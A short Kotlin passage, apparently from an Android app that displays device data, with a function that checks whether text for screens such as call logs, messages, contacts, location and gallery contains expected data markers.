        Screen.CONTACTS -> lowName.contains("contacts")
        Screen.LOCATION -> lowName.contains("location")
        Screen.GALLERY -> lowName.contains("gallery")
        else -> false
    }
}

fun isContentStructured(content: String, screen: Screen): Boolean {
    return when (screen) {
        Screen.DEVICES -> content.contains("**Device:**") && content.contains("**ID:**")
        Screen.CALL_LOGS -> content.contains("CALL_LOG_DATA:")
        Screen.MESSAGES -> content.contains("From:") || content.contains("SMS_DATA:")
        Screen.CONTACTS -> content.contains("CONTACT_DATA:")
        Screen.LOCATION -> content.contains("Lat:") || content.contains("LOCATION_DATA:")
        Screen.GALLERY -> content.contains("GALLERY_DATA:")
        else -> false
    }
}
